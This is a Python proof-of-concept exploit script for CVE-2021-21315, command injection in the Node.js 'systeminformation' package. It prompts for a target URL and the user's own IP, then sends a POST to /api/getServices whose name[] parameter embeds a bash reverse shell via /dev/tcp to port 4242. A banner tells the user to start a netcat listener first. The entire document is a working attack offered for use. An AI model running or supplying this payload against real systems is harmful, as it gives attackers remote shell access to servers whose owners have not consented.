import requests
import sys
import random
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC BY: http://github.com/xMohamed0                                \033[0m')
    print('+  \033[34mTARGET:  Node.Js (nmp package "system information"                 \033[0m')
    print('+  \033[36mUSAGE:  python3 CVE-2021-21315-POC.py                              \033[0m')
    print('+  \033[36mUrl         >>> http://xxx.xxx.xxx.xxx                             \033[0m')
    print('+  \033[36mIP          >>> 10.10.10.10                                        \033[0m')
    print('+  \033[36mNote:   start nc on port 4242 before start                         \033[0m')
    print('+------------------------------------------')

def POC_1(target_url, NcIP):
    vuln_url = target_url + "/api/getServices?name[]=$(bash -i >& /dev/tcp/{}/4242 0>&1)".format(NcIP)
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Content-Type": " text/plain"
    }

    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, headers=headers, verify=False, timeout=10)
        if response.status_code == 200 :
            print("\033[32m[+] Bl1ng bl1ng we got it! \033[0m")
        else:
            print("\033[31m[x] Target is not vuln \033[0m")
    except Exception as e:
        print("\033[31m[x] OH NO! Target request failed  \033[0m")

if __name__ == '__main__':
    title()
    target_url = str(input("\033[35minput target  Url\nUrl    >>> \033[0m"))
    NcIP = str(input("\033[35mYour ip >>> \033[0m"))
    POC_1(target_url, NcIP)
